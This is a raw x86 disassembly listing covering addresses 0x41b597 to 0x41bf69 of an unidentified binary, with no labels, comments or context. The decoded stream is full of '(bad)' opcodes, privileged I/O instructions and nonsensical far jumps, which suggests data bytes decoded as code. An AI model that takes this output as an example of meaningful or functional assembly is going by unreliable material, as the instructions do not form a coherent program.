  41b597:	pop    esp
  41b598:	jmp    0xfc4d3f53
  41b59d:	das    
  41b59e:	scas   al,BYTE PTR es:[edi]
  41b59f:	push   ecx
  41b5a0:	gs gs mov bl,cl
  41b5a4:	fs dec esp
  41b5a6:	cmp    al,0x30
  41b5a8:	sahf   
  41b5a9:	(bad)  
  41b5aa:	(bad)  
  41b5ac:	stos   BYTE PTR es:[edi],al
  41b5ad:	ins    DWORD PTR es:[edi],dx
  41b5ae:	dec    esp
  41b5af:	lea    ebp,[ebx-0x67]
  41b5b2:	cmc    
  41b5b3:	out    0xf1,al
  41b5b5:	and    BYTE PTR [ebp-0x3a16b707],al
  41b5bb:	inc    edi
  41b5bc:	rcr    DWORD PTR ds:0x222f12fb,1
  41b5c2:	shl    DWORD PTR [esi-0x35e01855],0xf4
  41b5c9:	test   eax,0xe62fe40a
  41b5ce:	jnp    0x41b555
  41b5d0:	sub    DWORD PTR [ecx],ebx
  41b5d2:	(bad)  
  41b5d3:	fisttp DWORD PTR [edi-0x32]
  41b5d6:	ins    DWORD PTR es:[edi],dx
  41b5d7:	cwde   
  41b5d8:	xor    DWORD PTR [edx-0x41757efc],edi
  41b5de:	sbb    eax,0xa5e673fe
  41b5e3:	xchg   edx,eax
  41b5e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5e5:	jp     0x41b57d
  41b5e7:	sbb    cl,dl
  41b5e9:	mov    ds:0xba592e23,al
  41b5ee:	push   esi
  41b5ef:	shr    ch,0xbc
  41b5f2:	stc    
  41b5f3:	call   0x23598b87
  41b5f8:	mov    bh,0x37
  41b5fa:	inc    esi
  41b5fb:	shl    BYTE PTR ds:0x79b4dffd,cl
  41b601:	push   0x6b3cb8ea
  41b606:	adc    eax,0x7e2d83d6
  41b60b:	pop    ebp
  41b60c:	ins    DWORD PTR es:[edi],dx
  41b60d:	dec    esi
  41b60e:	mov    ch,0xf0
  41b610:	in     al,0x8c
  41b612:	add    eax,0xe5411cd9
  41b617:	xchg   esi,eax
  41b618:	into   
  41b619:	retf   
  41b61a:	aad    0x58
  41b61c:	mov    eax,ds:0x360b2f80
  41b621:	xor    edx,edx
  41b623:	inc    esi
  41b624:	sub    bl,bh
  41b626:	cmp    DWORD PTR [ecx+edx*2-0x244eae06],0x55f0f599
  41b631:	push   0x79
  41b633:	jmp    0x7dc785b5
  41b638:	mov    ch,0x3c
  41b63a:	pop    ds
  41b63b:	and    esi,DWORD PTR [ecx+0x58eb8e7c]
  41b641:	out    dx,eax
  41b642:	test   eax,0x2ae76729
  41b647:	or     BYTE PTR [edx-0x1c],al
  41b64a:	mul    BYTE PTR [edx-0x9dff801]
  41b650:	cmp    BYTE PTR [di-0x1ee1],bh
  41b655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b656:	push   ss
  41b657:	dec    eax
  41b658:	test   eax,0xec40ee8f
  41b65d:	aas    
  41b65e:	stos   DWORD PTR es:[edi],eax
  41b65f:	mov    bh,0x6b
  41b661:	fmul   QWORD PTR [ecx+edi*8+0x1]
  41b665:	pop    edi
  41b666:	mov    dh,al
  41b668:	xchg   ecx,eax
  41b669:	adc    ecx,eax
  41b66b:	inc    edx
  41b66c:	ss push 0x4035fe75
  41b672:	daa    
  41b673:	outs   dx,BYTE PTR ds:[esi]
  41b674:	retf   0xc86e
  41b677:	je     0x41b6d5
  41b679:	sub    ebx,DWORD PTR [edx+0x5b]
  41b67c:	add    DWORD PTR [esp+ecx*8],0x58d3698b
  41b683:	inc    edi
  41b684:	xchg   edx,eax
  41b685:	loopne 0x41b6c9
  41b687:	ja     0x41b63d
  41b689:	pop    ebx
  41b68a:	mov    BYTE PTR [ebp+0x64],ch
  41b68d:	and    BYTE PTR [ebx+0xb1],al
	...
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	mov    ss,WORD PTR [ebx+edi*8+0x1231c25]
  41b707:	add    BYTE PTR [ecx+eax*1],al
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	fs mov ebx,0xfef3c62d
  41b712:	push   ebx
  41b713:	loope  0x41b6b0
  41b715:	sbb    edi,DWORD PTR [eax-0x583f3ec8]
  41b71b:	pop    eax
  41b71c:	pop    esi
  41b71d:	aam    0x10
  41b71f:	sub    ebx,DWORD PTR fs:[eax-0x6a4b6d93]
  41b726:	ret    
  41b727:	mov    ebp,0x94800a54
  41b72c:	fndisi(8087 only) 
  41b72e:	imul   cl
  41b730:	jno    0x41b7a1
  41b732:	test   esi,ebx
  41b734:	pop    ecx
  41b735:	ficomp WORD PTR [ebx]
  41b737:	mov    dh,0x6a
  41b739:	mov    esi,ebx
  41b73b:	mov    edi,0x354b6cf9
  41b740:	setl   BYTE PTR [ecx]
  41b743:	and    al,0x0
  41b745:	clc    
  41b746:	mov    al,ds:0xc5b6d88
  41b74b:	or     ah,ah
  41b74d:	popa   
  41b74e:	in     eax,dx
  41b74f:	test   cl,cl
  41b751:	adc    BYTE PTR [eax+0x12],0xe9
  41b755:	outs   dx,BYTE PTR ds:[esi]
  41b756:	inc    ebx
  41b757:	and    DWORD PTR [esp+ebx*2+0x625e5d33],0x8ffaee3e
  41b762:	add    BYTE PTR [ecx+0x30858f6c],dl
  41b768:	mov    ebx,0x3a5dffc5
  41b76d:	sub    eax,0x57c34fd3
  41b772:	or     al,0xda
  41b774:	repz jns 0x41b771
  41b777:	push   ss
  41b778:	sub    al,0x4a
  41b77a:	sbb    edi,eax
  41b77c:	jo     0x41b7b5
  41b77e:	in     eax,0x25
  41b780:	std    
  41b781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b782:	jns    0x41b722
  41b784:	sub    edi,DWORD PTR [eax+0x53]
  41b787:	mov    ecx,ss
  41b789:	popf   
  41b78a:	mov    edx,0x9f3ecd5e
  41b78f:	xchg   edx,eax
  41b790:	mov    al,ds:0xa8185352
  41b795:	dec    ecx
  41b796:	xchg   esi,eax
  41b797:	test   eax,0x17246a77
  41b79c:	retf   0xdf44
  41b79f:	aam    0xf5
  41b7a1:	and    DWORD PTR [ebx-0x2d],edx
  41b7a4:	ss test al,0xa7
  41b7a7:	ret    
  41b7a8:	sbb    cl,0x5e
  41b7ab:	push   0xffffffe2
  41b7ad:	sysenter 
  41b7af:	xor    BYTE PTR [eax-0xc0d6091],al
  41b7b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7b6:	mov    edi,DWORD PTR [edi+0x23]
  41b7b9:	pop    ebp
  41b7ba:	add    BYTE PTR [esp+eiz*8-0x1c],al
  41b7be:	mov    esi,0xd816c088
  41b7c4:	nop
  41b7c5:	lods   eax,DWORD PTR ds:[esi]
  41b7c6:	sbb    edx,DWORD PTR [esi-0xa]
  41b7c9:	xchg   ecx,eax
  41b7ca:	jmp    0xef1f:0x3c8a68dd
  41b7d1:	sbb    ecx,esp
  41b7d3:	sbb    eax,0xec4d3dcb
  41b7d8:	pop    eax
  41b7d9:	js     0x41b7ba
  41b7db:	mov    WORD PTR [edx],es
  41b7dd:	imul   ecx,ecx,0x3d
  41b7e0:	or     BYTE PTR [ebx-0x7ccf9bf6],cl
  41b7e6:	fwait
  41b7e7:	stos   BYTE PTR es:[edi],al
  41b7e8:	dec    edx
  41b7e9:	icebp  
  41b7ea:	les    ebx,FWORD PTR [edi+0x7802d53f]
  41b7f0:	and    eax,0x80efc651
  41b7f5:	aam    0x53
  41b7f7:	add    ebx,DWORD PTR [eax+0x4158a555]
  41b7fd:	sbb    ch,0xc3
  41b800:	adc    DWORD PTR [esi],ecx
  41b802:	leave  
  41b803:	push   ebp
  41b804:	loope  0x41b842
  41b806:	and    eax,0xcbafd6be
  41b80b:	cdq    
  41b80c:	cmp    ebx,0x40c1
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x2d
  41b881:	jmp    0x41b821
  41b883:	cmp    BYTE PTR [eax],ah
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	sub    eax,0x9acebf78
  41b891:	dec    edi
  41b892:	ret    0xc316
  41b895:	push   DWORD PTR [ebx]
  41b897:	ja     0x41b8c8
  41b899:	jo     0x41b8fe
  41b89b:	rcl    DWORD PTR [esi],0xb0
  41b89e:	or     DWORD PTR ds:0x60d3d83a,ebp
  41b8a4:	sti    
  41b8a5:	int3   
  41b8a6:	das    
  41b8a7:	sub    DWORD PTR [esi+0x23],0xffffffcb
  41b8ab:	rcl    DWORD PTR [ecx-0x59],cl
  41b8ae:	out    dx,al
  41b8af:	arpl   WORD PTR [esi+ebx*8],ax
  41b8b2:	call   0xaa81:0xdc6a3b8e
  41b8b9:	sub    dl,BYTE PTR [edx+0x6]
  41b8bc:	add    esp,edx
  41b8be:	and    al,0x23
  41b8c0:	jg     0x41b843
  41b8c2:	push   edx
  41b8c3:	mov    al,BYTE PTR [ebp+0x188fdaad]
  41b8c9:	cwde   
  41b8ca:	jne    0x41b8f6
  41b8cc:	jecxz  0x41b8fd
  41b8ce:	mov    edx,0x9009da29
  41b8d3:	ror    DWORD PTR [esi+0x3220f2f8],cl
  41b8d9:	ror    BYTE PTR [ecx-0x9a57920],0x39
  41b8e0:	pushf  
  41b8e1:	pop    esp
  41b8e2:	fwait
  41b8e3:	sbb    eax,DWORD PTR [edi+0x2ac073f4]
  41b8e9:	outs   dx,DWORD PTR ds:[esi]
  41b8ea:	stc    
  41b8eb:	adc    esp,0xffffffbc
  41b8ee:	pop    edi
  41b8ef:	loop   0x41b90e
  41b8f1:	popa   
  41b8f2:	sub    bl,bl
  41b8f4:	ds js  0x41b92f
  41b8f7:	shr    DWORD PTR [ebp+0x6bbf37c],1
  41b8fd:	sbb    BYTE PTR [edi-0x5d5d3954],dh
  41b903:	imul   eax,esi,0x70036f5f
  41b909:	inc    esp
  41b90a:	mov    fs,esi
  41b90c:	jmp    0x41b8b2
  41b90e:	inc    edi
  41b90f:	xor    DWORD PTR [esi],ebx
  41b911:	push   ecx
  41b912:	(bad)  
  41b913:	loopne 0x41b8cd
  41b915:	adc    eax,0x92b04684
  41b91a:	push   0xffffffa7
  41b91c:	rcr    dl,1
  41b91e:	cmp    ch,BYTE PTR [eax+0x1f3d6f4a]
  41b924:	rcl    DWORD PTR [edx+0x14],1
  41b927:	dec    ebx
  41b928:	push   ds
  41b929:	sub    BYTE PTR [esp+edi*1-0x5066948a],dl
  41b930:	cmc    
  41b931:	lea    ecx,[edx+esi*2-0x7d]
  41b935:	and    eax,0x3602e294
  41b93a:	sbb    DWORD PTR [eax],edi
  41b93c:	push   0xffffffda
  41b93e:	(bad)  
  41b93f:	(bad)
  41b942:	jbe    0x41b965
  41b944:	fcom   DWORD PTR [edi+eiz*2+0x64]
  41b948:	dec    edx
  41b949:	pop    ebx
  41b94a:	fs pusha 
  41b94c:	mov    edi,ss
  41b94e:	mov    esp,0xc8628cf9
  41b953:	sbb    eax,0x4393718a
  41b958:	pop    ecx
  41b959:	dec    ecx
  41b95a:	clc    
  41b95b:	or     eax,0x361f544f
  41b960:	loopne 0x41b936
  41b962:	out    dx,eax
  41b963:	sti    
  41b964:	mov    esp,0xdf63f79b
  41b969:	rol    DWORD PTR [edi],cl
  41b96b:	hlt    
  41b96c:	xor    BYTE PTR [eax+0x28],0xd0
  41b970:	push   ds
  41b971:	mov    ebp,0xb17fd783
  41b976:	lock add al,0xd8
  41b979:	ret    
  41b97a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b97b:	adc    BYTE PTR [esi+0x13],ah
  41b97e:	jg     0x41b96f
  41b980:	loopne 0x41b9d8
  41b982:	jns    0x41b962
  41b984:	stc    
  41b985:	outs   dx,DWORD PTR ds:[esi]
  41b986:	inc    edx
  41b987:	retf   0x403e
  41b98a:	add    ebp,edi
  41b98c:	ficom  WORD PTR [ecx-0x5e]
  41b98f:	pop    es
	...
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	(bad)  
  41ba01:	out    dx,eax
  41ba02:	data16 fisub DWORD PTR [eiz*1+0x1040001]
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	add    ebp,DWORD PTR [edi]
  41ba0e:	cli    
  41ba0f:	ret    
  41ba10:	out    dx,al
  41ba11:	dec    BYTE PTR [eax+0x2aa2297e]
  41ba17:	push   ss
  41ba18:	dec    esp
  41ba19:	lds    esp,FWORD PTR [edi-0x1177667c]
  41ba1f:	test   DWORD PTR [ebx+0x45],edx
  41ba22:	sbb    bl,0xf7
  41ba25:	fidivr WORD PTR [eax-0x395f56f6]
  41ba2b:	mov    cl,0x6c
  41ba2d:	jnp    0x41b9fd
  41ba2f:	mov    dh,0xed
  41ba31:	mov    bl,0x1c
  41ba33:	test   eax,0x6f59d46c
  41ba38:	mov    ch,0x8c
  41ba3a:	mov    ds:0x3e2cc13c,eax
  41ba3f:	out    dx,eax
  41ba40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba41:	std    
  41ba42:	push   eax
  41ba43:	fsub   QWORD PTR [ebp-0x24806dae]
  41ba49:	sbb    esp,DWORD PTR [ebx]
  41ba4b:	xor    DWORD PTR es:[edi+ebp*1],eax
  41ba4f:	jmp    0x41bac2
  41ba51:	ds jecxz 0x41babe
  41ba54:	mov    edi,0x88bcad9e
  41ba59:	into   
  41ba5a:	mov    ecx,0xee58df6b
  41ba5f:	mov    bl,0xa6
  41ba61:	mov    esi,0x3597f0c1
  41ba66:	and    eax,0xfad193a9
  41ba6b:	jo     0x41ba2a
  41ba6d:	dec    ecx
  41ba6e:	xor    dh,bl
  41ba70:	enter  0xc3cd,0xa2
  41ba74:	lods   al,BYTE PTR ds:[esi]
  41ba75:	scas   al,BYTE PTR es:[edi]
  41ba76:	daa    
  41ba77:	push   eax
  41ba78:	cdq    
  41ba79:	xchg   DWORD PTR [eax+0x4e5065d4],edi
  41ba7f:	cs jle 0x41baa4
  41ba82:	pop    esi
  41ba83:	sub    al,0x20
  41ba85:	aad    0x96
  41ba87:	sub    DWORD PTR [eax],eax
  41ba89:	test   eax,0x4b282f06
  41ba8e:	shl    DWORD PTR [ebx],cl
  41ba90:	sub    esi,DWORD PTR [ecx+0x3864b529]
  41ba96:	jbe    0x41ba2c
  41ba98:	hlt    
  41ba99:	sub    DWORD PTR [ecx+eiz*4+0x1674be2c],esi
  41baa0:	stos   DWORD PTR es:[edi],eax
  41baa1:	mov    DWORD PTR [eax+0x32120d4d],ebp
  41baa7:	fild   QWORD PTR [ecx+0x22]
  41baaa:	adc    DWORD PTR cs:[ebp-0x59],0x8d3fbcf
  41bab2:	sbb    dl,ch
  41bab4:	pushf  
  41bab5:	(bad)  
  41bab6:	popa   
  41bab7:	inc    ebx
  41bab8:	cwde   
  41bab9:	std    
  41baba:	inc    esp
  41babb:	jno    0x41bad8
  41babd:	pop    ebx
  41babe:	stos   BYTE PTR es:[edi],al
  41babf:	xor    al,0x4
  41bac1:	retf   0x45c1
  41bac4:	aas    
  41bac5:	lock stos DWORD PTR es:[edi],eax
  41bac7:	or     al,0xc0
  41bac9:	jbe    0x41ba60
  41bacb:	jmp    DWORD PTR [edi+eiz*8]
  41bace:	dec    esi
  41bacf:	inc    ebx
  41bad0:	sahf   
  41bad1:	and    DWORD PTR [eax+0x2b3cd145],edx
  41bad7:	lea    ecx,[edx+0x7d]
  41bada:	xchg   edi,eax
  41badb:	or     al,0x44
  41badd:	or     BYTE PTR [edi+0x76],bl
  41bae0:	xor    al,0x1d
  41bae2:	(bad)  
  41bae3:	or     BYTE PTR [ecx],cl
  41bae5:	mov    esi,0x9be5eb09
  41baea:	pop    edx
  41baeb:	jmp    0x26d2:0x884b7d94
  41baf2:	mov    dl,0xcb
  41baf4:	pop    ebp
  41baf5:	sbb    al,0xd7
  41baf7:	dec    esp
  41baf8:	and    eax,0x1f6baa1b
  41bafd:	cwde   
  41bafe:	jp     0x41bb5c
  41bb00:	sbb    eax,0xcaa6a6c2
  41bb05:	dec    ebp
  41bb06:	in     eax,0xdc
  41bb08:	retf   
  41bb09:	pop    es
  41bb0a:	jp     0x41bb42
  41bb0c:	(bad)  
  41bb0d:	xor    BYTE PTR [esi+0xc7],ah
	...
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x74],cx
  41bb81:	rcr    DWORD PTR [ecx+ebp*8+0x28],cl
  41bb85:	add    DWORD PTR es:[eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	jecxz  0x41bbe6
  41bb8e:	pop    esp
  41bb8f:	rcl    esp,0x2
  41bb92:	loopne 0x41bb61
  41bb94:	add    eax,0x8bdaa73b
  41bb99:	and    eax,0x88a32dc6
  41bb9e:	mov    dh,0xf1
  41bba0:	mov    edi,0x77f0010
  41bba5:	add    DWORD PTR ds:0xcefd9670,esp
  41bbab:	mov    ?,WORD PTR [eax+ecx*4]
  41bbae:	xchg   edx,eax
  41bbaf:	stos   BYTE PTR es:[edi],al
  41bbb0:	loopne 0x41bc31
  41bbb2:	aad    0x18
  41bbb4:	mov    dh,0xdc
  41bbb6:	mov    ds:0x2c79ab2e,eax
  41bbbb:	es scas eax,DWORD PTR es:[edi]
  41bbbd:	fist   DWORD PTR [edi]
  41bbbf:	dec    edx
  41bbc0:	inc    eax
  41bbc1:	je     0x41bb87
  41bbc3:	add    DWORD PTR [edx*1+0x279dd112],edi
  41bbca:	pop    ds
  41bbcb:	lahf   
  41bbcc:	mov    bl,0xf6
  41bbce:	imul   ecx,eax,0x54
  41bbd1:	fucomp st(2)
  41bbd3:	rcr    BYTE PTR [ebp+0x5e],0xa7
  41bbd7:	jle    0x41bc1f
  41bbd9:	add    al,ch
  41bbdb:	dec    eax
  41bbdc:	std    
  41bbdd:	cmp    ah,BYTE PTR ds:0xa08fb51e
  41bbe3:	ins    BYTE PTR es:[edi],dx
  41bbe4:	sti    
  41bbe5:	or     ah,dh
  41bbe7:	sbb    edx,ebx
  41bbe9:	retf   
  41bbea:	cmp    eax,DWORD PTR [ebx]
  41bbec:	mov    ecx,0xb7122eef
  41bbf1:	lods   eax,DWORD PTR ds:[esi]
  41bbf2:	and    ah,ch
  41bbf4:	iret   
  41bbf5:	jo     0x41bbe3
  41bbf7:	mov    edx,0x17cf952f
  41bbfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbfd:	test   BYTE PTR [ebp+ebp*8-0x32],dl
  41bc01:	fmulp  st(4),st
  41bc03:	add    al,0x7b
  41bc05:	rcr    BYTE PTR [eax],0xa9
  41bc08:	sbb    DWORD PTR [ecx+eiz*4],esp
  41bc0b:	sbb    eax,0x70cec924
  41bc10:	loopne 0x41bc06
  41bc12:	out    dx,al
  41bc13:	and    al,0x4e
  41bc15:	add    cl,dl
  41bc17:	bound  edx,QWORD PTR ds:0xd2bae78a
  41bc1d:	or     cl,BYTE PTR [edx+0x5e1af0cb]
  41bc23:	mov    ecx,0x2da8be0f
  41bc28:	(bad)  
  41bc29:	jae    0x41bc92
  41bc2b:	out    0x9d,al
  41bc2d:	in     al,dx
  41bc2e:	fnstenv [ecx]
  41bc30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc31:	and    eax,edi
  41bc33:	(bad)  
  41bc34:	es pop eax
  41bc36:	stos   DWORD PTR es:[edi],eax
  41bc37:	inc    ecx
  41bc38:	cli    
  41bc39:	add    al,0x35
  41bc3b:	ds push cs
  41bc3d:	arpl   WORD PTR [edi],bx
  41bc3f:	push   cs
  41bc40:	add    ch,BYTE PTR [edi-0x4e]
  41bc43:	mov    dh,bl
  41bc45:	sub    BYTE PTR [edi],0xde
  41bc48:	mov    bl,0x98
  41bc4a:	mov    ?,WORD PTR [esi-0x26bc3e6b]
  41bc50:	into   
  41bc51:	xchg   ebp,eax
  41bc52:	cmp    eax,0x462bce5
  41bc57:	cdq    
  41bc58:	inc    ebx
  41bc59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5a:	cmp    al,0x50
  41bc5c:	add    eax,eax
  41bc5e:	xor    ebp,DWORD PTR [edx-0x49c6d988]
  41bc64:	aam    0x29
  41bc66:	icebp  
  41bc67:	push   0xd8771735
  41bc6c:	mov    ecx,fs
  41bc6e:	pusha  
  41bc6f:	ror    BYTE PTR fs:[ebx-0x585953ed],1
  41bc76:	and    eax,0x2ef25d38
  41bc7b:	cmp    edx,eax
  41bc7d:	xchg   edx,eax
  41bc7e:	repz test DWORD PTR [ebx+edx*1+0x71],0xa19e8a1f
  41bc87:	das    
  41bc88:	adc    dl,BYTE PTR [ebp+0x48]
  41bc8b:	mov    edx,0x99449f58
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xac89d9d8
  41bd02:	mov    ds:0x1272c95,al
  41bd07:	add    BYTE PTR [ecx+eax*1],al
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	lock push es
  41bd0e:	int3   
  41bd0f:	jb     0x41bd8c
  41bd11:	xchg   DWORD PTR [edx],ebx
  41bd13:	jno    0x41bd71
  41bd15:	cs in  al,dx
  41bd17:	or     eax,0x46ab360d
  41bd1c:	cmp    ah,BYTE PTR [ecx*4-0x1eb0c507]
  41bd23:	mov    eax,ds:0x65b375d
  41bd28:	into   
  41bd29:	iret   
  41bd2a:	pop    es
  41bd2b:	test   bl,ah
  41bd2d:	jl     0x41bcc7
  41bd2f:	push   ds
  41bd30:	inc    edi
  41bd31:	add    ch,BYTE PTR [ebx]
  41bd33:	retf   0x847d
  41bd36:	mov    dl,0xa
  41bd38:	call   0xcece:0x5c7fdd5f
  41bd3f:	jbe    0x41bd5f
  41bd41:	pop    ss
  41bd42:	jg     0x41bd4d
  41bd44:	jnp    0x41bd02
  41bd46:	neg    DWORD PTR [edx]
  41bd48:	add    al,0x8a
  41bd4a:	jnp    0x41bcfa
  41bd4c:	mov    esp,0xc8a40c02
  41bd51:	jb     0x41bd6c
  41bd53:	or     BYTE PTR [edi],bl
  41bd55:	fld    TBYTE PTR [esi+0x553af006]
  41bd5b:	mov    esi,DWORD PTR [esi+edx*2-0x59]
  41bd5f:	fcmovnbe st,st(1)
  41bd61:	imul   ebx,DWORD PTR [ecx-0x29640d4c],0xffffffa8
  41bd68:	and    al,0xd4
  41bd6a:	(bad)  
  41bd6b:	leave  
  41bd6c:	dec    edi
  41bd6d:	cdq    
  41bd6e:	mov    dl,0xc1
  41bd70:	nop
  41bd71:	cmp    eax,0x5421845a
  41bd76:	adc    DWORD PTR [ebp+eiz*2+0xb40d11f],0x92c16199
  41bd81:	pop    esp
  41bd82:	stc    
  41bd83:	arpl   WORD PTR [ebp+edx*8+0x44ace082],ax
  41bd8a:	cmp    ebx,DWORD PTR [eax-0x5a]
  41bd8d:	mov    cl,0x6d
  41bd8f:	add    al,0xa2
  41bd91:	jnp    0x41bde1
  41bd93:	aaa    
  41bd94:	pop    eax
  41bd95:	and    edx,DWORD PTR [edx+0x319986d5]
  41bd9b:	jbe    0x41bd77
  41bd9d:	rol    bl,0xdc
  41bda0:	inc    edi
  41bda1:	das    
  41bda2:	sti    
  41bda3:	mov    edi,0xfd140bf9
  41bda8:	push   es
  41bda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdaa:	sub    eax,0x6236aac4
  41bdaf:	sub    al,0xed
  41bdb1:	in     eax,dx
  41bdb2:	mov    esi,edi
  41bdb4:	clc    
  41bdb5:	xchg   DWORD PTR ds:0xfbbb7b8,esp
  41bdbb:	out    0x49,eax
  41bdbd:	addr16 aam 0x5a
  41bdc0:	ret    0xb3c6
  41bdc3:	clc    
  41bdc4:	sub    ebp,esp
  41bdc6:	imul   eax,DWORD PTR [esi+0x53],0xffffffeb
  41bdca:	mov    eax,ds:0xe54b1541
  41bdcf:	xchg   edx,eax
  41bdd0:	and    eax,0x287a17af
  41bdd5:	pushf  
  41bdd6:	inc    eax
  41bdd7:	popa   
  41bdd8:	adc    esi,DWORD PTR ds:0x602dfe5b
  41bdde:	push   edx
  41bddf:	imul   eax,DWORD PTR [esi-0x642ffde4],0x1e
  41bde6:	jp     0x41bd88
  41bde8:	mov    bl,0x64
  41bdea:	push   eax
  41bdeb:	out    0x56,al
  41bded:	jne    0x41bdbc
  41bdef:	xchg   edi,eax
  41bdf0:	out    0x86,eax
  41bdf2:	dec    ebx
  41bdf3:	sub    ebx,ecx
  41bdf5:	ja     0x41be0e
  41bdf7:	ins    DWORD PTR es:[edi],dx
  41bdf8:	pop    eax
  41bdf9:	add    BYTE PTR [eax+0x3de5bbc4],0xe1
  41be00:	push   ds
  41be01:	daa    
  41be02:	out    dx,al
  41be03:	adc    esi,ecx
  41be05:	cmp    dl,ch
  41be07:	in     al,0x24
  41be09:	and    eax,0x12ed35be
  41be0e:	cmp    al,BYTE PTR [edx]
	...
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx-0x698fc09a]
  41be82:	int3   
  41be83:	cmp    DWORD PTR [eax],esi
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR [ecx+eax*1],al
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	xchg   ecx,eax
  41be8d:	(bad)  
  41be8e:	vmread DWORD PTR [esi+0x39],edi
  41be92:	pusha  
  41be93:	mov    ah,0x7d
  41be95:	adc    DWORD PTR [eax+0x3a54311b],0x230c50a1
  41be9f:	mov    ecx,0x5929a2f9
  41bea4:	stos   BYTE PTR es:[edi],al
  41bea5:	xchg   ecx,eax
  41bea6:	aaa    
  41bea7:	les    ebx,FWORD PTR [eax+0x74c2c72b]
  41bead:	fsub   DWORD PTR [edi+eiz*8-0x8]
  41beb1:	(bad)  
  41beb2:	loope  0x41bf21
  41beb4:	sub    bl,0xb1
  41beb7:	pop    edx
  41beb8:	jge    0x41befe
  41beba:	inc    esi
  41bebb:	jns    0x41bf2c
  41bebd:	and    edi,esp
  41bebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bec0:	dec    ecx
  41bec1:	dec    eax
  41bec2:	push   ebx
  41bec3:	xor    dl,BYTE PTR [edx]
  41bec5:	pop    edx
  41bec6:	or     bl,cl
  41bec8:	in     al,0x40
  41beca:	dec    ebx
  41becb:	or     al,0x80
  41becd:	dec    ebp
  41bece:	in     al,dx
  41becf:	cmp    esp,ebx
  41bed1:	addr16 test eax,0x610e810b
  41bed7:	arpl   WORD PTR [edi],sp
  41bed9:	inc    ebp
  41beda:	imul   ebx,DWORD PTR [ebp-0x56ca05d8],0x4719271f
  41bee4:	rcl    bl,1
  41bee6:	sub    al,0xfe
  41bee8:	popa   
  41bee9:	in     al,dx
  41beea:	mov    bl,0xb8
  41beec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beed:	jp     0x41be81
  41beef:	jb     0x41bf3c
  41bef1:	pop    ss
  41bef2:	cmp    DWORD PTR [eax+ebp*2+0x36388c6],0xffffffcf
  41befa:	cmp    al,0x26
  41befc:	xchg   edx,eax
  41befd:	xchg   esi,eax
  41befe:	push   eax
  41beff:	stos   BYTE PTR es:[edi],al
  41bf00:	jp     0x41bed3
  41bf02:	(bad)  
  41bf03:	cmp    esi,ebp
  41bf05:	imul   BYTE PTR [esi*2+0x1ac3afd9]
  41bf0c:	or     cl,BYTE PTR [edi+0x649d269a]
  41bf12:	pop    ebp
  41bf13:	aad    0xbb
  41bf15:	xor    ecx,DWORD PTR [eax+0x46]
  41bf18:	inc    DWORD PTR cs:[ecx]
  41bf1b:	or     BYTE PTR [eax-0x18914b28],ch
  41bf21:	and    bl,BYTE PTR [edi-0x66]
  41bf24:	call   0x69c27554
  41bf29:	cmp    ebp,DWORD PTR [ebx]
  41bf2b:	int3   
  41bf2c:	pop    ecx
  41bf2d:	sti    
  41bf2e:	mov    ebx,0xd05d7368
  41bf33:	or     al,0x86
  41bf35:	push   eax
  41bf36:	aaa    
  41bf37:	aaa    
  41bf38:	and    eax,0xac4f46cd
  41bf3d:	jg     0x41bfb0
  41bf3f:	(bad)  
  41bf40:	adc    al,0x30
  41bf42:	xchg   DWORD PTR [edx+0x25],eax
  41bf45:	inc    eax
  41bf46:	xchg   edx,eax
  41bf47:	adc    eax,0x81205d9f
  41bf4c:	lods   al,BYTE PTR ds:[esi]
  41bf4d:	pop    ecx
  41bf4e:	leave  
  41bf4f:	nop
  41bf50:	jp     0x41bfc1
  41bf52:	scas   al,BYTE PTR es:[edi]
  41bf53:	sbb    DWORD PTR [eax+0x35],ebp
  41bf56:	ins    DWORD PTR es:[edi],dx
  41bf57:	jecxz  0x41bf84
  41bf59:	cs mov bl,0xb8
  41bf5c:	add    DWORD PTR [edx-0x22],edi
  41bf5f:	popa   
  41bf60:	rol    BYTE PTR [eax+edx*8-0x35],1
  41bf64:	cmp    al,0xf
  41bf66:	jb     0x41bf91
  41bf68:	inc    ebp
  41bf69:	dec    ebp
